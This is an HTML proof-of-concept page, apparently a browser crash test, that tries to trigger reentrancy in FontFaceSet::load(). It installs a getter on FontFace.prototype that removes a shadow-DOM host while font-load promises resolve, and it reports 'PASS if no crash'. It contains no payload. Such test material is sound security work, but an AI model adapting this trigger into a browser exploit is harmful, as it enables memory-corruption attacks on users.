<!DOCTYPE html>
<html>
<body>
<script>
// POC 2: Reentrância via FontFaceSet::load() + faceFinished
// (resolução das promises pendentes durante o processamento de status)

function log(message) {
    document.body.appendChild(document.createTextNode(message));
    document.body.appendChild(document.createElement("br"));
}

function run() {
    const host = document.createElement("div");
    document.body.appendChild(host);
    const shadowRoot = host.attachShadow({ mode: "open" });

    const fontFaceStyle = document.createElement("style");
    fontFaceStyle.textContent = `@font-face { font-family: reentryFont; src: url("resources/no-such-font-for-reentry.otf"); }`
        + `.probe { font: 24px reentryFont; }`;
    shadowRoot.appendChild(fontFaceStyle);

    const probe = document.createElement("span");
    probe.className = "probe";
    probe.textContent = "A";
    shadowRoot.appendChild(probe);

    document.body.offsetHeight; // force layout

    // Prepend de stylesheet (caminho Reset)
    const prependedStyle = document.createElement("style");
    prependedStyle.textContent = ".unused { color: red; }";
    shadowRoot.prepend(prependedStyle);

    let getterCallCount = 0;

    // Thenable que remove o host durante a resolução das promises
    // criadas por FontFaceSet::load / faceFinished
    Object.defineProperty(FontFace.prototype, "then", {
        configurable: true,
        get() {
            delete FontFace.prototype.then;
            ++getterCallCount;
            host.remove();
            return undefined;
        }
    });

    // Caminho principal desta POC: document.fonts.load()
    // Isso chama matchingFaces → face.load() → depois faceFinished resolve as promises
    document.fonts.load("24px reentryFont", "A").then(() => {
        log("load promise resolved (não deveria chegar aqui se removeu cedo)");
    }).catch(() => {});

    // Trigger de flush (igual ao original)
    document.styleSheets.length;

    log("FontFace.prototype.then getter calls: " + getterCallCount);
    log("PASS if no crash.");
}

window.addEventListener("load", () => setTimeout(run, 0));
</script>
</body>
</html>
